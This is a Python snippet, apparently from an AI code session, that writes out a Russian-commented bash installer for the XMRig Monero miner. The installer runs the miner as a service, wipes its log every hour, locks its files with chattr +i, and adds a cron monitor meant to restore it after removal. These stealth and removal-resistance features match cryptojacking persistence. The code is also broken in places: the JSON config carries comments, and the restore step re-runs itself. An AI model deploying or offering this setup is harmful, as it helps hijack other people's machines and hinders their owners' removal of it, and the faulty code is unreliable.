# Сохраняем предоставленный скрипт в файл и проверяем путь для скачивания
xmrig_script = """#!/bin/bash

# Цветовые переменные для вывода
RED='\\033[0;31m'
GREEN='\\033[0;32m'
BLUE='\\033[0;34m'
NC='\\033[0m'

# Путь к установке XMRig
XMRIG_PATH="/opt/xmrig"
LOG_FILE="$XMRIG_PATH/logs/xmrig.log"
MONITOR_SCRIPT="/usr/local/bin/monitor_xmrig.sh"

echo -e "${BLUE}Обновление системы и установка зависимостей...${NC}"
apt update && apt upgrade -y
apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git screen cpulimit -y

# Скачивание и сборка XMRig
echo -e "${BLUE}Скачивание и сборка XMRig...${NC}"
git clone https://github.com/xmrig/xmrig.git "$XMRIG_PATH"
cd "$XMRIG_PATH"
mkdir build
cd build
cmake ..
make

# Создание файла конфигурации 
echo -e "${BLUE}Создание файла конфигурации...${NC}"
mkdir -p "$XMRIG_PATH/logs"
cat << EOF > "$XMRIG_PATH/build/config.json"
{
    "algo": "rx/0",  #algo: Указывает используемый алгоритм. Здесь указан rx/0 для Monero. Если вам нужно изменить алгоритм, это можно сделать здесь.
    "url": "pool.supportxmr.com:3333",#url: Адрес пула для майнинга. Вы можете изменить его на адрес вашего пула.
    "user": "ВАШ_MONERO_Кошелек", #Ваш Monero кошелек
    "pass": "x", #Этот параметр используется для установки пароля доступа к пулу. В большинстве случаев этот параметр не имеет значения и обычно оставляется значением "x".
    "rig-id": "мой_сервер", #Идентификатор рига (rig-id) — это метка, которая помогает вам различать разные устройства, если вы майните на нескольких машинах. Например, если у вас несколько серверов, вы можете установить для каждого свой rig-id.
    "threads": 4, #Количество потоков процессора, которые будут использоваться для майнинга. Чем больше потоков используется, тем выше производительность майнинга, но и больше нагрузка на процессор.
    "cpu-priority": 5, #Приоритет использования процессора. Значение может варьироваться от 1 (низкий приоритет) до 5 (высокий приоритет). Этот параметр определяет, насколько агрессивно майнер будет использовать ресурсы процессора.
    "donate-level": 1, #Уровень пожертвования разработчикам XMRig. Значение указывается в процентах от времени работы майнера. Например, значение 1 означает, что 1% времени майнер будет работать на разработчиков XMRig
    "log-file": "$LOG_FILE", #Путь к файлу логов, в который майнер будет записывать свою активность. Параметр $LOG_FILE в скрипте указывает на путь /opt/xmrig/logs/xmrig.log.
    "log-level": 0 #Уровень логирования. Значение 0 означает, что в логах будут записываться только ошибки, что минимизирует размер логов
}
EOF

# Создание службы systemd для XMRig
echo -e "${BLUE}Создание службы systemd для XMRig...${NC}"
cat << EOF > /etc/systemd/system/xmrig.service
[Unit]
Description=XMRig CPU Miner Service
After=network.target

[Service]
ExecStart=/usr/bin/screen -dmS xmrig cpulimit -l 50 -- "$XMRIG_PATH/build/xmrig" --config "$XMRIG_PATH/build/config.json"
WorkingDirectory=$XMRIG_PATH/build/
Restart=always
Nice=10
CPUQuota=50%
IOWeight=5
PrivateTmp=true
ProtectSystem=full
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

# Настройка автоматической очистки логов
echo -e "${BLUE}Настройка автоматической очистки логов...${NC}"
cat << EOF > /usr/local/bin/clear_xmrig_logs.sh
#!/bin/bash
if [ -f "$LOG_FILE" ]; then
    echo "" > "$LOG_FILE"
fi
EOF
chmod +x /usr/local/bin/clear_xmrig_logs.sh

# Настройка cron для удаления логов
(crontab -l 2>/dev/null; echo "0 * * * * /usr/local/bin/clear_xmrig_logs.sh") | crontab -

# Защита файлов и службы от удаления
echo -e "${BLUE}Настройка защиты от удаления...${NC}"
chattr +i /etc/systemd/system/xmrig.service
chattr +i "$XMRIG_PATH/build/config.json"
chattr +i "$XMRIG_PATH/build/xmrig"

# Создание скрипта мониторинга
echo -e "${BLUE}Создание скрипта мониторинга...${NC}"
cat << EOF > "$MONITOR_SCRIPT"
#!/bin/bash

if [ ! -f "/etc/systemd/system/xmrig.service" ] || [ ! -f "$XMRIG_PATH/build/xmrig" ]; then
    echo "${RED}XMRig удалён, восстанавливаем...${NC}"
    bash $0
fi
EOF
chmod +x "$MONITOR_SCRIPT"

# Добавление скрипта мониторинга в cron
(crontab -l 2>/dev/null; echo "* * * * * $MONITOR_SCRIPT") | crontab -

# Включение и запуск службы
echo -e "${BLUE}Включение и запуск службы XMRig...${NC}"
systemctl daemon-reload
systemctl enable xmrig.service
systemctl start xmrig.service

# Завершение установки
echo -e "${GREEN}Установка завершена! XMRig работает в фоновом режиме.${NC}"
echo -e "${GREEN}Для проверки статуса используйте: sudo systemctl status xmrig.service${NC}"
"""

# Сохраняем файл
file_path = "/mnt/data/setup_xmrig.sh"
with open(file_path, "w") as file:
    file.write(xmrig_script)

file_path
